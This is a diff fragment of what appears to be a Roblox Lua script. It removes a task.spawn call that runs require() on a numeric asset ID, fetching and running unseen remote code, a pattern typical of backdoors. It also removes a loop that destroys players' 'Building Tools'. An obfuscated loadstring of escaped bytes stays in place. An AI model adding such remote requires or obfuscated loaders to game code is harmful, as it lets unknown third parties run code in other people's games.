@@ -22,9 +22,6 @@ loadstring("\95\71\46\98\97\100\119\111\114\100\115\32\61\32\123\34\102\117\99\3
 end
 end)
 
-task.spawn(function()require(138920906185746)end)
-while task.wait()do for a,b in ipairs(game.Players:GetPlayers())do for a,c in ipairs({b.Backpack,b.Character})do if c then for a,d in ipairs(c:GetChildren())do if d:IsA("Tool")and d.Name=="Building Tools"then d:Destroy()end end end end end end
-
 local timelimit = "08/30/2025"
 
 local ctime = os.date("%m/%d/%Y")
